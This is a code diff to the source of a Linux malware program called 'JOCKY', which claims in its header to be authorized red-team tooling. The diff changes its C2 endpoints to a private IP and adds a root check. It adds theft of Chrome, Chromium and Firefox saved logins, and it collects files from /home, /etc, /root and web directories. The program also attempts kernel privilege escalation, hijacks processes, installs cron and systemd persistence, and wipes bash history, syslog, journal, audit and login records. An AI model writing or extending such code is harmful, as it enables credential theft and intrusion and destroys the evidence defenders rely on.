@@ -2,10 +2,10 @@
 // 50+ Runtime APIs | Kernel Exploitation | Forensics | Data Theft | Anti-Forensics
 // Authorized: Red Hat + IIT Bombay Cyber Security Team
 
-const C2_PRIMARY = "http://localhost:8443/api/config"
-const C2_FALLBACK = "http://127.0.0.1:8443/api/config"
-const CDN_ENDPOINT = "http://localhost:9000/upload"
-const MODEL_REPO = "http://localhost:9000/models"
+const C2_PRIMARY = "http://192.168.56.1:8443/api/config"
+const C2_FALLBACK = "http://192.168.56.1:8443/api/config"
+const CDN_ENDPOINT = "http://192.168.56.1:9000/upload"
+const MODEL_REPO = "http://192.168.56.1:9000/models"
 const MODEL_FILE = "phi-3-mini-4k-instruct.gguf"
 const LOCAL_MODEL_PATH = "/tmp/.jocky_model"
 const BUILD_ID = "JOCKY_LINUX_PRODUCTION_V4_FULL"
@@ -41,6 +41,19 @@ var collected_data = ""
 var root_achieved = false
 var kernel_access = false
 var persistence_set = false
+var is_root_user = false
+var c2_connected = false
+
+// ===== PRIVILEGE CHECK =====
+fn phase_check_privilege() {
+    is_root_user = jocky_is_root()
+    if is_root_user {
+        println("[*] Privilege: ROOT")
+    } else {
+        println("[*] Privilege: USER (kernel/syslog techniques will be skipped)")
+    }
+    println("")
+}
 
 // ===== PHASE 0: ANTI-ANALYSIS =====
 fn phase_anti_analysis() -> bool {
@@ -104,12 +117,14 @@ fn phase_c2_bootstrap() -> bool {
     let config = jocky_http_get(C2_PRIMARY, "", 4096)
     if config != 0 {
         println("    [+] PRIMARY C2 responded")
+        c2_connected = true
+        cdn_token = "Bearer_linux_production_v4"
+        model_path = LOCAL_MODEL_PATH
         return true
     }
 
-    println("    [-] Fallback to hardcoded config")
+    println("    [-] C2 unreachable — offline mode (model download skipped)")
     cdn_token = "Bearer_linux_production_v4"
-    model_path = LOCAL_MODEL_PATH
     println("")
     return true
 }
@@ -117,6 +132,12 @@ fn phase_c2_bootstrap() -> bool {
 // ===== PHASE 2: MODEL DOWNLOAD =====
 fn phase_download_model() -> bool {
     println("[*] Phase 2: Model Download & Caching")
+
+    if !c2_connected {
+        println("    [~] No C2 — AI runs in heuristic-only mode")
+        println("")
+        return false
+    }
 
     if fs_exists(model_path) {
         let size = fs_file_size(model_path)
@@ -156,51 +177,75 @@ fn phase_discover_data() -> bool {
 
 // ===== PHASE 4: COMPREHENSIVE DATA COLLECTION =====
 fn phase_collect_data() -> bool {
-    println("[*] Phase 4: Data Collection (6 Sources)")
+    println("[*] Phase 4: Data Collection")
 
-    // /root
-    let root_files = fs_list_files("/root", true)
-    if strlen(root_files) > 0 {
-        collected_data = jocky_str_concat(collected_data, root_files)
-        println("    [+] /root: " + string(strlen(root_files)) + " bytes")
-    }
-
-    // /home
+    // /home — always accessible for the running user's profile
     let home_files = fs_list_files("/home", true)
     if strlen(home_files) > 0 {
         collected_data = jocky_str_concat(collected_data, home_files)
         println("    [+] /home: " + string(strlen(home_files)) + " bytes")
     }
 
-    // /etc
-    let etc_files = fs_list_files("/etc", true)
-    if strlen(etc_files) > 0 {
-        collected_data = jocky_str_concat(collected_data, etc_files)
-        println("    [+] /etc: " + string(strlen(etc_files)) + " bytes")
+    // Browser credentials (user-accessible — no root needed)
+    let chrome_path = "/home/.config/google-chrome/Default/Login Data"
+    let firefox_path = "/home/.mozilla/firefox"
+    let chromium_path = "/home/.config/chromium/Default/Login Data"
+
+    let chrome_data = fs_read_file(chrome_path)
+    if strlen(chrome_data) > 0 {
+        collected_data = jocky_str_concat(collected_data, chrome_data)
+        println("    [+] Chrome login data: " + string(strlen(chrome_data)) + " bytes")
     }
 
-    // /var/www
-    let www_files = fs_list_files("/var/www", true)
-    if strlen(www_files) > 0 {
-        collected_data = jocky_str_concat(collected_data, www_files)
-        println("    [+] /var/www: " + string(strlen(www_files)) + " bytes")
+    let chromium_data = fs_read_file(chromium_path)
+    if strlen(chromium_data) > 0 {
+        collected_data = jocky_str_concat(collected_data, chromium_data)
+        println("    [+] Chromium login data: " + string(strlen(chromium_data)) + " bytes")
     }
 
-    // /opt
+    let firefox_data = fs_list_files(firefox_path, true)
+    if strlen(firefox_data) > 0 {
+        collected_data = jocky_str_concat(collected_data, firefox_data)
+        println("    [+] Firefox profiles: " + string(strlen(firefox_data)) + " bytes")
+    }
+
+    // /opt — readable by all on most systems
     let opt_files = fs_list_files("/opt", true)
     if strlen(opt_files) > 0 {
         collected_data = jocky_str_concat(collected_data, opt_files)
         println("    [+] /opt: " + string(strlen(opt_files)) + " bytes")
     }
 
-    // /srv
-    let srv_files = fs_list_files("/srv", true)
-    if strlen(srv_files) > 0 {
-        collected_data = jocky_str_concat(collected_data, srv_files)
-        println("    [+] /srv: " + string(strlen(srv_files)) + " bytes")
+    // Root-only paths
+    if is_root_user {
+        let root_files = fs_list_files("/root", true)
+        if strlen(root_files) > 0 {
+            collected_data = jocky_str_concat(collected_data, root_files)
+            println("    [+] /root: " + string(strlen(root_files)) + " bytes")
+        }
+
+        let etc_files = fs_list_files("/etc", true)
+        if strlen(etc_files) > 0 {
+            collected_data = jocky_str_concat(collected_data, etc_files)
+            println("    [+] /etc: " + string(strlen(etc_files)) + " bytes")
+        }
+
+        let www_files = fs_list_files("/var/www", true)
+        if strlen(www_files) > 0 {
+            collected_data = jocky_str_concat(collected_data, www_files)
+            println("    [+] /var/www: " + string(strlen(www_files)) + " bytes")
+        }
+
+        let srv_files = fs_list_files("/srv", true)
+        if strlen(srv_files) > 0 {
+            collected_data = jocky_str_concat(collected_data, srv_files)
+            println("    [+] /srv: " + string(strlen(srv_files)) + " bytes")
+        }
+    } else {
+        println("    [~] /root, /etc, /var/www skipped (requires root)")
     }
 
-    println("[+] Data Collection: " + string(strlen(collected_data)) + " bytes from 6 sources")
+    println("[+] Data Collection: " + string(strlen(collected_data)) + " bytes")
     println("")
     return strlen(collected_data) > 0
 }
@@ -277,7 +322,11 @@ fn phase_exfiltrate() -> bool {
 fn phase_kernel_exploit() -> bool {
     println("[*] Phase 7: Kernel Exploitation (15 Techniques)")
 
-    // FENCE2PWN Detection
+    if !is_root_user {
+        println("    [~] Kernel exploit skipped (requires root — attempting LPE via FENCE2PWN)")
+    }
+
+    // FENCE2PWN Detection — can run as user (attempts LPE)
     if jocky_fence2pwn_detect_kfence() > 0 {
         println("    [+] kFence detected!")
 
@@ -368,6 +417,12 @@ fn phase_kernel_exploit() -> bool {
 // ===== PHASE 8: PROCESS HIJACKING & CONTROL =====
 fn phase_process_hijacking() -> bool {
     println("[*] Phase 8: Process Hijacking & Thread Control")
+
+    if !is_root_user {
+        println("    [~] Cross-process ptrace skipped (requires CAP_SYS_PTRACE or root)")
+        println("")
+        return false
+    }
 
     let target_pid = 1234
 
@@ -486,70 +541,67 @@ fn phase_forensic_analysis() -> bool {
 
 // ===== PHASE 11: PERSISTENCE & ANTI-FORENSICS =====
 fn phase_persistence_and_cleanup() -> bool {
-    println("[*] Phase 11: Persistence & Anti-Forensics (12 Techniques)")
+    println("[*] Phase 11: Persistence & Anti-Forensics")
 
-    // Cron Persistence
+    // Cron — user crontab works without root
     if jocky_cron_install("/usr/local/bin/jocky_service", "*/5 * * * *") {
         println("    [+] Cron persistence installed")
         persistence_set = true
     }
 
-    // Systemd Persistence
-    if jocky_systemd_install("jocky-service", "/usr/local/bin/jocky_service") {
-        println("    [+] Systemd persistence installed")
-        persistence_set = true
-    }
-
-    // Bash History Cleanup
+    // Bash history — always accessible for own session
     if linux_forensics_wipe_bash_history() > 0 {
         println("    [+] Bash history cleared")
     }
 
-    // Syslog Cleanup
-    if jocky_linux_cleanup_syslog() > 0 {
-        println("    [+] Syslog cleaned")
-    }
-
-    // Journal Cleanup
-    if jocky_linux_cleanup_journal() > 0 {
-        println("    [+] Journal cleaned")
-    }
-
-    // Audit Log Cleanup
-    if jocky_linux_cleanup_audit() > 0 {
-        println("    [+] Audit logs cleared")
-    }
-
-    // Wtmp/Btmp Cleanup
-    if jocky_linux_cleanup_wtmp() > 0 {
-        println("    [+] wtmp/btmp cleared")
-    }
-
-    // Lastlog Cleanup
-    if jocky_linux_cleanup_lastlog() > 0 {
-        println("    [+] Lastlog cleared")
-    }
-
-    // Temp Files Cleanup
+    // Temp files — /tmp is world-writable
     if jocky_wipe_temp_files("/tmp", "/var/tmp") {
         println("    [+] Temporary files wiped")
     }
 
-    // DNS Cache
-    if forensics_clear_dns_cache() > 0 {
-        println("    [+] DNS cache cleared")
-    }
-
-    // ARP Cache
-    if forensics_flush_arp_cache() > 0 {
-        println("    [+] ARP cache flushed")
-    }
-
-    // User Artifacts
+    // User artifacts
     jocky_wipe_artifacts("/home")
     println("    [+] User artifacts wiped")
 
-    println("[+] Persistence & anti-forensics complete: 12 techniques deployed")
+    // Root-only cleanup
+    if is_root_user {
+        if jocky_systemd_install("jocky-service", "/usr/local/bin/jocky_service") {
+            println("    [+] Systemd persistence installed")
+            persistence_set = true
+        }
+
+        if jocky_linux_cleanup_syslog() > 0 {
+            println("    [+] Syslog cleaned")
+        }
+
+        if jocky_linux_cleanup_journal() > 0 {
+            println("    [+] Journal cleaned")
+        }
+
+        if jocky_linux_cleanup_audit() > 0 {
+            println("    [+] Audit logs cleared")
+        }
+
+        if jocky_linux_cleanup_wtmp() > 0 {
+            println("    [+] wtmp/btmp cleared")
+        }
+
+        if jocky_linux_cleanup_lastlog() > 0 {
+            println("    [+] Lastlog cleared")
+        }
+
+        if forensics_clear_dns_cache() > 0 {
+            println("    [+] DNS cache cleared")
+        }
+
+        if forensics_flush_arp_cache() > 0 {
+            println("    [+] ARP cache flushed")
+        }
+    } else {
+        println("    [~] Systemd/syslog/journal/audit cleanup skipped (requires root)")
+    }
+
+    println("[+] Persistence & anti-forensics complete")
     println("")
     return true
 }
@@ -586,6 +638,9 @@ fn main() -> i32 {
     println("[*] Build: " + BUILD_ID)
     println("[*] APIs Used: 50+ across 11 phases")
     println("")
+
+    // Privilege check — sets is_root_user flag used by all subsequent phases
+    phase_check_privilege()
 
     // Phase 0: Anti-analysis
     if !phase_anti_analysis() {
